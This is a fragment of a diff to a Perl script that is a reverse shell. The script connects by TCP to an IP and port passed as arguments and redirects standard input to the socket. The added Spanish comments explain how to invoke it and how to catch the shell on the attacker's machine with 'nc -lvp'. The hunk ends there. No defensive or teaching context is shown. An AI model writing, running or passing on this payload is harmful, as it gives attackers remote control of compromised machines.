@@ -3,6 +3,9 @@ use Socket;
 my $i = $ARGV[0];
 my $p = $ARGV[1];
 
+#invocar usando comando.pl "ip" "port"
+#y en maquina local en terminal usar nc -lvp "port"
+
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
 if(connect(S,sockaddr_in($p,inet_aton($i)))){
     open(STDIN, ">&S");
